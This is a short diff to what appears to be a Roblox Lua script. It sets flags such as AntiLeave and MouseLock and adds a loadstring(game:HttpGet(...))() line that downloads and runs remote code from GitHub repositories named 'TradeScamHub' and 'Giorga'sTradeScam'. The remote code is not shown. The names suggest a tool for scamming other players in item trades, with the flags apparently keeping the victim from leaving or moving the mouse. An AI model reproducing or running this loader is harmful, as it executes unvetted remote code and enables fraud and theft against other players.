@@ -6,4 +6,4 @@ _G.LoadingScreen = true
 _G.AntiLeave = true
 _G.MouseLock = true
 
-https://raw.githubusercontent.com/Giorgi0ku/Trade-scamm/main/Trade-ScamGioHub
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Giorgi0ku/TradeScamHub/main/Giorga'sTradeScam", true))()
